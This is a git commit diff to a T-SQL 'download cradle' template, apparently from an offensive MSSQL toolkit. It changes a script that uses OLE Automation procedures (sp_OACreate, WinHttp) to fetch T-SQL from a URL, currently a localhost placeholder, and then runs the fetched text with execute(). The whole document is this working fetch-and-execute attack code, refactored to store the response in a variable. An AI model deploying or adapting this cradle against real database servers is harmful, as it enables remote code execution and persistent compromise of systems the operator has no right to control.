aa15a40e87e6d6348096e91c3a189b0954b6c116
Scott Sutherland <nullbind@users.noreply.github.com>
2017-09-06 07:40:30 -0500

    Update download_cradle_tsql_oap.sql

--- Stable-ish/MSSQL/templates-tsql/download_cradle_tsql_oap.sql
+++ Stable-ish/MSSQL/templates-tsql/download_cradle_tsql_oap.sql
@@ -1,17 +1,12 @@
--- OLE Automation Procedure Download Cradle Example
-
 -- Setup Variables
 DECLARE @url varchar(300)   
 DECLARE @win int  
 DECLARE @hr  int  
-DECLARE @text varchar(8000) 
+DECLARE @Command varchar(8000) 
 
 -- Set target url containting TSQL
 SET @url = 'http://127.0.0.1/test.txt'
 SET @url = 'http://127.0.0.1/mycmd.txt'
-
--- Create temp table to store downloaded string
-CREATE TABLE #text(html text NULL) /* comment out to use @text variable for small data */ 
 
 -- Setup namespace
 EXEC @hr=sp_OACreate 'WinHttp.WinHttpRequest.5.1',@win OUT  
@@ -22,21 +17,14 @@ EXEC @hr=sp_OAMethod @win, 'Open',NULL,'GET',@url,'false'
 -- Send http GET request
 EXEC @hr=sp_OAMethod @win,'Send'
 
--- Grab response and throw it in the temp table 
-INSERT #text(html) 
-EXEC @hr=sp_OAGetProperty @win,'ResponseText' 
+-- Grab response and throw it in the temp table  
+EXEC @hr=sp_OAGetProperty @win,'ResponseText', @Command out
 
 -- Destroy the object
 EXEC @hr=sp_OADestroy @win  
 
--- Select commad
-SELECT @text = html from #text
-SELECt @text
+-- Display command
+SELECT @Command
 
 -- Run command
-execute(@text) 
-
--- Remove temp table
-drop table #text 
-
- 
+execute(@Command) 
